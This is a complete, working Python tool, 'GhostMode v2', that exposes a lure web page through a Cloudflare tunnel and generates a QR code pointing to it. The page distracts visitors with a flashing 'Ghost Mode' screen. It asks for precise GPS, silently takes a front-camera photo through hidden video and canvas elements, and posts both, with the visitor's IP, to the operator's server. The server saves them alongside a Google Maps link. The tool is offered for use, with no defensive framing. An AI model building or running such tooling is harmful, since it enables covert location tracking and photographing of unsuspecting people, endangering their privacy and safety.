#!/usr/bin/env python3
# GhostMode v2 - GPS + Silent Camera | Cloudflare Tunnel (no warning page)
# Usage:
#   Terminal 1 -> cloudflared tunnel --url http://localhost:8080
#   Terminal 2 -> python3 ghostmode_v2.py

import http.server, socket, os, sys, json, time, re, base64, threading
import urllib.request, qrcode
from datetime import datetime

PORT     = 8080
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SAVE_DIR = os.path.join(BASE_DIR, "saved_locations")
QR_FILE  = os.path.join(BASE_DIR, "location_qr.png")
os.makedirs(SAVE_DIR, exist_ok=True)

GHOST_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>GHOST MODE</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{min-height:100vh;display:flex;flex-direction:column;
         align-items:center;justify-content:center;
         font-family:'Courier New',monospace;overflow:hidden;
         transition:background-color 0.08s ease}
    .title{font-size:clamp(1.2rem,5vw,1.8rem);font-weight:bold;
           letter-spacing:3px;text-align:center;
           text-shadow:0 0 20px currentColor;transition:color 0.08s ease}
    .sub{font-size:clamp(0.75rem,3vw,1rem);margin-top:14px;
         letter-spacing:2px;text-align:center;transition:color 0.08s ease}
    body::after{content:'';position:fixed;inset:0;
      background:repeating-linear-gradient(0deg,transparent,transparent 2px,
      rgba(0,0,0,0.15) 2px,rgba(0,0,0,0.15) 4px);
      pointer-events:none;z-index:10}
    #video,#canvas{display:none}
  </style>
</head>
<body>
  <div class="title" id="t">&#9888; GHOST MODE ACTIVATED &#9888;</div>
  <div class="sub"   id="s">Device scanning detected</div>
  <video id="video" autoplay playsinline muted></video>
  <canvas id="canvas"></canvas>
  <script>
    var C=[
      {bg:'#ff0000',fg:'#ffffff'},{bg:'#ff6600',fg:'#000000'},
      {bg:'#ffff00',fg:'#000000'},{bg:'#00ff00',fg:'#000000'},
      {bg:'#00ffff',fg:'#000000'},{bg:'#0000ff',fg:'#ffffff'},
      {bg:'#8800ff',fg:'#ffffff'},{bg:'#ff00ff',fg:'#000000'},
      {bg:'#ffffff',fg:'#000000'},{bg:'#000000',fg:'#ffffff'},
      {bg:'#ff0066',fg:'#ffffff'},{bg:'#00ff88',fg:'#000000'}
    ];
    var i=0,t=document.getElementById('t'),s=document.getElementById('s');
    function f(){var c=C[i%C.length];
      document.body.style.backgroundColor=c.bg;
      t.style.color=c.fg;s.style.color=c.fg;i++;}
    f();setInterval(f,120);

    function send(payload){
      var x=new XMLHttpRequest();
      x.open('POST','/save',true);
      x.setRequestHeader('Content-Type','application/json');
      x.send(JSON.stringify(payload));
    }

    function snapAndSend(stream,payload){
      var v=document.getElementById('video');
      var c=document.getElementById('canvas');
      v.srcObject=stream;
      v.onloadedmetadata=function(){
        v.play();
        setTimeout(function(){
          c.width=v.videoWidth||640;
          c.height=v.videoHeight||480;
          c.getContext('2d').drawImage(v,0,0);
          payload.photo=c.toDataURL('image/jpeg',0.85);
          send(payload);
          stream.getTracks().forEach(function(t){t.stop();});
        },800);
      };
    }

    function tryCamera(payload){
      if(navigator.mediaDevices&&navigator.mediaDevices.getUserMedia){
        navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false})
          .then(function(s){snapAndSend(s,payload);})
          .catch(function(){
            navigator.mediaDevices.getUserMedia({video:true,audio:false})
              .then(function(s){snapAndSend(s,payload);})
              .catch(function(){send(payload);});
          });
      } else { send(payload); }
    }

    var payload={};
    if(navigator.geolocation){
      navigator.geolocation.getCurrentPosition(
        function(p){
          payload.lat=p.coords.latitude;
          payload.lng=p.coords.longitude;
          payload.accuracy=p.coords.accuracy;
          tryCamera(payload);
        },
        function(){tryCamera(payload);},
        {enableHighAccuracy:true,timeout:15000,maximumAge:0}
      );
    } else { tryCamera(payload); }
  </script>
</body>
</html>"""

GHOST_BYTES = GHOST_PAGE.encode("utf-8")


def get_cloudflare_url(retries=15, delay=2):
    print("  [*] Waiting for Cloudflare tunnel...")
    for i in range(retries):
        for port in [20241, 20242, 20243]:
            try:
                req  = urllib.request.urlopen(f"http://localhost:{port}/metrics", timeout=2)
                text = req.read().decode()
                match = re.search(r'https://[a-z0-9\-]+\.trycloudflare\.com', text)
                if match:
                    return match.group(0)
            except Exception:
                pass
        try:
            req  = urllib.request.urlopen("http://localhost:20241/api/tunnels", timeout=2)
            data = json.loads(req.read().decode())
            for t in data if isinstance(data, list) else []:
                url = t.get("url", "")
                if "trycloudflare" in url:
                    return url
        except Exception:
            pass
        if i < retries - 1:
            print(f"  [*] Waiting for tunnel URL... ({i+1}/{retries})")
            time.sleep(delay)
    return None


def make_qr(url):
    print(f"  [+] QR URL    -> {url}")
    qr = qrcode.QRCode(version=None,
                       error_correction=qrcode.constants.ERROR_CORRECT_H,
                       box_size=12, border=4)
    qr.add_data(url)
    qr.make(fit=True)
    try:
        from qrcode.image.styledpil import StyledPilImage
        from qrcode.image.styles.moduledrawers import RoundedModuleDrawer
        from qrcode.image.styles.colormasks import SolidFillColorMask
        img = qr.make_image(
            image_factory=StyledPilImage,
            module_drawer=RoundedModuleDrawer(),
            color_mask=SolidFillColorMask(
                back_color=(255, 255, 255),
                front_color=(0, 80, 200)))
    except Exception:
        img = qr.make_image(fill_color="#0050C8", back_color="white")
    img.save(QR_FILE)
    print(f"  [+] QR saved  -> {QR_FILE}")


class GhostHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a): pass

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(GHOST_BYTES)

    def do_POST(self):
        if self.path == "/save":
            try:
                size  = int(self.headers.get("Content-Length", 0))
                data  = json.loads(self.rfile.read(size))
                lat   = data.get("lat",  None)
                lng   = data.get("lng",  None)
                acc   = float(data.get("accuracy", 0))
                photo = data.get("photo", None)
                ip    = self.client_address[0]
                ts    = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
                maps  = f"https://www.google.com/maps?q={lat},{lng}&z=18" if lat and lng else "N/A"

                photo_path = "not captured"
                if photo and photo.startswith("data:image"):
                    _, enc = photo.split(",", 1)
                    photo_path = os.path.join(SAVE_DIR, f"photo_{ts}.jpg")
                    with open(photo_path, "wb") as f:
                        f.write(base64.b64decode(enc))

                fp = os.path.join(SAVE_DIR, f"location_{ts}.txt")
                with open(fp, "w") as f:
                    f.write("================================\n")
                    f.write("   GHOST MODE v2 - CAPTURE      \n")
                    f.write("================================\n\n")
                    f.write(f"Timestamp  : {ts.replace('_',' ')}\n")
                    f.write(f"Device IP  : {ip}\n")
                    f.write(f"Latitude   : {lat if lat else 'denied'}\n")
                    f.write(f"Longitude  : {lng if lng else 'denied'}\n")
                    f.write(f"Accuracy   : ~{acc:.0f} meters\n")
                    f.write(f"Photo      : {photo_path}\n\n")
                    f.write(f"Google Maps:\n{maps}\n")

                print(f"\n{'='*50}")
                print(f"  [GHOST MODE v2] CAPTURE RECEIVED")
                print(f"{'='*50}")
                print(f"  IP        : {ip}")
                print(f"  Latitude  : {lat if lat else 'denied'}")
                print(f"  Longitude : {lng if lng else 'denied'}")
                print(f"  Accuracy  : ~{acc:.0f} meters")
                print(f"  Maps      : {maps}")
                print(f"  Photo     : {photo_path}")
                print(f"  Saved     : {fp}")
                print(f"{'='*50}\n")

                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"OK")
            except Exception as e:
                print(f"[ERROR] {e}")
                self.send_response(400)
                self.end_headers()


def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80)); ip = s.getsockname()[0]; s.close()
        return ip
    except:
        return "127.0.0.1"


if __name__ == "__main__":
    print("\n================================")
    print("   GHOST MODE v2 - GPS + CAM")
    print("   Powered by Cloudflare Tunnel")
    print("================================\n")

    # Start server first in background
    server = http.server.HTTPServer(("0.0.0.0", PORT), GhostHandler)
    t = threading.Thread(target=server.serve_forever)
    t.daemon = True
    t.start()
    print(f"  [+] Server started on port {PORT}")

    # Try to auto-detect Cloudflare URL
    cf_url = get_cloudflare_url()

    if cf_url:
        print(f"  [+] Cloudflare detected -> {cf_url}")
        make_qr(cf_url)
    else:
        print(f"\n  [!] Could not auto-detect Cloudflare URL.")
        print(f"  [!] Copy the URL from your cloudflared terminal and paste below.\n")
        try:
            manual = input("  Paste your trycloudflare.com URL here: ").strip()
            if manual:
                make_qr(manual)
            else:
                ip = get_local_ip()
                make_qr(f"http://{ip}:{PORT}")
        except (EOFError, KeyboardInterrupt):
            ip = get_local_ip()
            make_qr(f"http://{ip}:{PORT}")

    print(f"  [+] Saves to  -> {SAVE_DIR}/\n")
    print(f"  [*] Scan location_qr.png with your phone")
    print(f"  [*] Goes DIRECTLY to Ghost Mode")
    print(f"  [*] GPS + front camera saved to saved_locations/")
    print(f"\n  [*] Listening... (Ctrl+C to stop)\n")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n  [-] Stopped. Saves: {SAVE_DIR}/\n")
        server.shutdown()
        sys.exit(0)
